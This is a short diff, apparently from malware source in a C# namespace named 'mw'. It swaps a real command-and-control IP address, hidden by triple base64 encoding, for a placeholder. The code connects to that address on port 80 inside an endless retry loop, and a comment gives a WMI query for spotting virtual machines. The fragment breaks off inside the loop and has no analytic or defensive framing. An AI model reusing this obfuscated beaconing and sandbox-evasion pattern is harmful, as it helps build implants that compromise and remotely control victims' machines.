@@ -17,8 +17,8 @@ namespace mw
             
             //Get-WmiObject -Query "Select * from Win32_CacheMemory" to check for vm
 
-            //create a stream to 99.70.90.188:80
-            string ip = base64.decode(base64.decode(base64.decode("VDFScmRVNTZRWFZQVkVGMVRWUm5OQT09")));
+            //create a stream to ip:80
+            string ip = base64.decode(base64.decode(base64.decode("ip base 64 encoded 3 times")));
             int port = 80;
             while(true) {
                 try{
